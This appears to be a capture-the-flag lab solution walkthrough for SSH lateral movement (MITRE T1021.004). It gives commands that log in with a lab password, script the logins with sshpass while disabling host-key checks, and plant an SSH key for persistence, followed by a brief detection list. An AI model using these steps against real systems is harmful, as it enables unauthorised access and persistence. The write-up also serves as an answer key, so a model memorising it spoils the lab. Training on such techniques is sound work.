# T1021.004 – SSH Remote Command Execution | Solution Walkthrough
**Difficulty:** Easy | **OS:** Linux | **MITRE:** T1021.004

## Step 1 – Password-Based SSH Lateral Movement
```bash
# Interactive session:
ssh target_srv@localhost
# password: Target@321
cat ~/.flags/flag.txt
exit

# Inline command (non-interactive):
ssh target_srv@localhost "cat ~/.flags/flag.txt"
# HACKTIFY{SSH_LATERAL_MOVE_<hash>}
```

## Step 2 – Non-Interactive with sshpass
```bash
# sshpass bypasses interactive password prompt:
sshpass -p 'Target@321' ssh -o StrictHostKeyChecking=no target_srv@localhost "cat ~/.flags/flag.txt"
# Useful in scripts for automated lateral movement
```

## Step 3 – Key-Based Auth Setup (Persistence)
```bash
# Generate SSH key pair:
ssh-keygen -t rsa -b 4096 -f /tmp/lm_key -N ""
# Copy public key to target:
sshpass -p 'Target@321' ssh-copy-id -i /tmp/lm_key.pub target_srv@localhost
# Now SSH without password:
ssh -i /tmp/lm_key target_srv@localhost "cat ~/.flags/flag.txt"
```

## Step 4 – ProxyJump (SSH through intermediate host)
```bash
# Jump through host1 to reach host2:
ssh -J player@host1 target_srv@host2 "command"
# OR in ~/.ssh/config:
# Host target
#   ProxyJump jump_host
```

## Detection
- Monitor `sshd` auth logs: `/var/log/auth.log`
- Unusual SSH connections (new src IP, odd hours)
- `sshpass` in process list / command line = scripted brute/lateral movement
